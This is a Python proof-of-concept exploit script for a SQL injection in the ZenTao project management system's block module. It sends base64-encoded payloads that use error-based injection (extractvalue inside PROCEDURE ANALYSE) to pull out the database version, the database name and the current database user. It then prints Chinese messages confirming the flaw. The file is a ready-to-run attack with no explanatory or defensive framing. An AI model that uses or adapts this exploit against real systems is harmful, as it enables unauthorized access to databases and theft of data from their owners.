import json,requests,re

url = 'http://192.168.58.129/zentao/'
payload = '/index.php?m=block&f=main&mode=getblockdata&blockid=case&param='

if not url.startswith('http'):
    url = 'http' + url

headers = {
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Accept-Encoding": "gzip, deflate",
    "Referer":url
}

payload1 = 'eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsdmVyc2lvbigpKSksMSkjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ=='
payload2 = 'eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsZGF0YWJhc2UoKSkpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0='
payload3 = 'eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsdXNlcigpKSksMSkjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ=='
exp = payload1
exp2 = payload2
exp3 = payload3
try:
    r = requests.get(url+payload+exp,headers=headers)
    bug = re.findall("1105 XPATH syntax error: ':(.*?)'<p>",r.text)[0]
    print('漏洞存在，当前数据库版本为：' + bug)
    r = requests.get(url+payload+exp2,headers=headers)
    bug = re.findall("1105 XPATH syntax error: ':(.*?)'<p>",r.text)[0]
    print('漏洞存在，当前数据库为：' + bug)
    r = requests.get(url+payload+exp3,headers=headers)
    bug = re.findall("1105 XPATH syntax error: ':(.*?)'<p>",r.text)[0]
    print('漏洞存在，当前数据库用户为：' + bug)
except Exception as e:
    print('漏洞检测失败')

